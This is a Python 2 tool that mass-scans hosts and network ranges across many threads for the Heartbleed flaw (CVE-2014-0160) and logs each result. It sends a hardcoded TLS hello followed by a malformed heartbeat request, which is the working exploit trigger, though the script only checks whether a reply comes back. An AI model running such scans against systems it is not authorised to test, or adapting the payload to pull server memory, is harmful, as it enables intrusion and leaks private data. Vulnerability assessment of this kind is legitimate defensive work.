#!/usr/bin/env python

# Single-host usage example: python ssltest.py example.com
# To see all options for multiple hosts and multi-threading: python ssltest.py --help

import sys
import struct
import socket
import time
import select
import re
import threading
import netaddr
import json
import os
import datetime
import signal
from optparse import OptionParser
from collections import defaultdict
from multiprocessing.dummy import Pool

host_status = {}
hosts_to_skip = []
counter = defaultdict(int)
lock = threading.Lock()

options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains')
options.add_option('--port', '-p', dest="port", default=443, help="Port to scan on all hosts or networks, default 443")
options.add_option('--input', '-i', dest="input_file", default=[], action="append", help="Optional input file of networks or ip addresses, one address per line")
options.add_option('--logfile', '-o', dest="log_file", default="results.txt", help="Optional logfile destination")
options.add_option('--resume', dest="resume", action="store_true", default=False, help="Do not rescan hosts that are already in the logfile")
options.add_option('--timeout', '-t', dest="timeout", default=5, help="How long to wait for remote host to respond before timing out")
options.add_option('--threads', dest="threads", default=100, help="If specific, run X concurrent threads")
options.add_option('--json', dest="json_file", default=None, help="Save data as json into this file")
options.add_option('--only-vulnerable', dest="only_vulnerable", action="store_true", default=False, help="Only scan hosts that have been scanned before and were vulnerable")
options.add_option('--only-unscanned', dest="only_unscanned", action="store_true", default=False, help="Only scan hosts that appear in the json file but have not been scanned")
options.add_option('--summary', dest="summary", action="store_true", default=False, help="Useful with --json. Don't scan, just print old results")
options.add_option('--verbose', dest="verbose", action="store_true", default=False, help="Print verbose information to screen")
options.add_option('--max', dest="max", default=None, help="Exit program after scanning X hosts. Useful with --only-unscanned")
opts, args = options.parse_args()

threadpool = Pool(processes=int(opts.threads))


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 03 00  dc 01 00 00 d8 03 03 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay


def hit_hb(s):
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False

        if typ == 24:
            return True

        if typ == 21:
            return False

def unpack_handshake(pay):
    """
    Unpack the SSL handshake in Multiple Handshake Message
    """
    paylen = len(pay)
    offset = 0
    payarr = []

    while offset < paylen:
        h = pay[offset:offset + 4]
        t, l24 = struct.unpack('>B3s', h)
        l = struct.unpack('>I', '\x00' + l24)[0]
        payarr.append((
            t,
            l,
            pay[offset+4:offset+4+l]
            ))
        offset = offset+l+4
    return payarr

def is_vulnerable(host, timeout, port=443):
    """ Check if remote host is vulnerable to heartbleed

     Returns:
        None  -- If remote host has no ssl
        False -- Remote host has ssl but likely not vulnerable
        True  -- Remote host might be vulnerable
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(int(timeout))
    try:
        s.connect((host, int(port)))
    except Exception, e:
        return None
    s.send(hello)

    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return None

        if typ == 22:
            payarr = unpack_handshake(pay)
            # Look for server hello done message.
            finddone = [t for t, l, p in payarr if t == 14]
            if len(finddone) > 0:
                break

    # construct heartbeat request packet
    ver_chr = chr(ver&0xff)
    hb  = h2bin("18 03") + ver_chr + h2bin("40 00 01 3f fd") + "\x01"*16381
    hb += h2bin("18 03") + ver_chr + h2bin("00 03 01 00 00")

    s.send(hb)
    return hit_hb(s)


def store_results(host_name, current_status):
    current_time = time.time()
    with lock:
        counter[current_status] += 1
        counter["Total"] += 1
        if host_name not in host_status:
            host_status[host_name] = {}
        host = host_status[host_name]
        # Make a note when this host was last scanned
        host['last_scan'] = current_time

        # Make a note if this host has never been scanned before
        if 'first_scan' not in host:
            host['first_scan'] = current_time
        elif host.get('status', 'never been scanned') != current_status:
            # If it has a different check result from before
            host['changelog'] = host.get('changelog', [])
            changelog_entry = [current_time, current_status]
            host['changelog'].append(changelog_entry)
        host['status'] = current_status
        with open(opts.log_file, 'a') as f:
            message = "{current_time} {host} {current_status}".format(**locals())
            f.write(message + "\n")
            return message


def scan_host(host):
    """ Scans a single host, logs into

    Returns:
        list(timestamp, ipaddress, vulnerabilitystatus)
    """
    if opts.max and int(opts.max) >= counter["Total"]:
        return
    host = str(host)
    if host in hosts_to_skip:
        return
    result = is_vulnerable(host, opts.timeout, opts.port)
    message = store_results(host, result)
    if opts.verbose:
        print message
    return message


def scan_hostlist(hostlist, threads=5):
    """ Iterates through hostlist and scans them

    Arguments:
        hostlist    -- Iterable with ip addresses
        threads     -- If specified, run in multithreading mode
    """
    task = threadpool.map_async(scan_host, hostlist)
    while True:
        print counter['Total'], "hosts done"
        task.wait(1)
        if task.ready() or hasattr(threadpool, 'done'):
            return
    threadpool.close()
    threadpool.join()


def clean_hostlist(args):
    """ Returns list of iterables
    Examples:
    >>> hostlist = ["127.0.0.1", "127.0.0.2"]
    >>> clean_hostlist(hostlist)
    """
    hosts = []
    networks = []
    for i in args:
        # If it contains any alphanumerics, it might be a domain name
        if any(c.isalpha() for c in i):
            # Special hack, because alexa top x list is kind of weird
            i = i.split('/')[0]
            hosts.append(i)
        # If arg contains a / we assume its a network name
        elif '/' in i:
            networks.append(netaddr.IPNetwork(i))
        else:
            hosts.append(i)
    result = []
    for network in networks:
        if network.size >= opts.threads:
            result.append(network)
        else:
            for i in network:
                hosts.append(str(i))
    if hosts:
        result.append(hosts)
    return result


def import_json(filename):
    """ Reads heartbleed data in json format from this file """
    with open(filename) as f:
        json_data = f.read()
    data = json.loads(json_data)
    for k, v in data.items():
        host_status[k] = v


def export_json(filename):
    """ Save scan results into filename as json data
    """
    json_data = json.dumps(host_status, indent=4)
    with open(filename, 'w') as f:
        f.write(json_data)


def print_summary():
    """ Print summary of previously stored json data to screen """
    if not opts.json_file:
        pass
        #options.error("You need to provide --json with --summary")
    else:
        import_json(opts.json_file)
    counter = defaultdict(int)
    for host, data in host_status.items():
        friendly_status = "unknown"
        status = data.get('status', "Not scanned")
        if status is None:
            friendly_status = "SSL Connection Failed"
        elif status is True:
            friendly_status = "Vulnerable"
        elif status is False:
            friendly_status = "Not Vulnerable"
        else:
            friendly_status = str(status)
        last_scan = int(float(data.get('last_scan',0)))
        last_scan = datetime.datetime.fromtimestamp(last_scan).strftime('%Y-%m-%d %H:%M:%S')
        counter[friendly_status] += 1
        counter['Total'] += 1
        if opts.only_vulnerable and not status:
            continue
        elif opts.only_unscanned and 'status' in data:
            continue
        print "%s %-20s %5s" % (last_scan, host, friendly_status)
    print "------------ summary -----------"
    for k,v in counter.items():
        print "%-7s %s" % (v, k)
    return

def signal_handler(signal, frame):
    print "Ctrl+C pressed.. aborting..."
    threadpool.terminate()
    threadpool.done = True

def main():
    if opts.summary:
        print_summary()
        return

    if not args and not opts.input_file and not opts.json_file:
        options.print_help()
        return


    # If any input files were provided, parse through them and add all addresses to "args"
    for input_file in opts.input_file:
        with open(input_file) as f:
            for line in f:
                words = line.split()
                if not words:
                    continue
                # If input file is in masscan's portscan format
                if line.startswith("Discovered open port"):
                    args.append(words.pop())
                elif len(words) == 1:
                    args.append(words[0])
                else:
                    print "Skipping invalid input line: " % line
                    continue
    if opts.json_file:
        try:
            import_json(opts.json_file)
        except IOError:
            print opts.json_file, "not found. Not importing any data"


        for host_name, data in host_status.items():
            if opts.only_unscanned and 'status' in data:
                continue
            if data.get('status', None) is True or not opts.only_vulnerable:
                args.append(host_name)

    # For every network in args, convert it to a netaddr network, so we can iterate through each host
    remote_networks = clean_hostlist(args)
    for network in remote_networks:
        scan_hostlist(network, threads=opts.threads)

    if opts.json_file:
        export_json(opts.json_file)

    print_summary()

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    main()
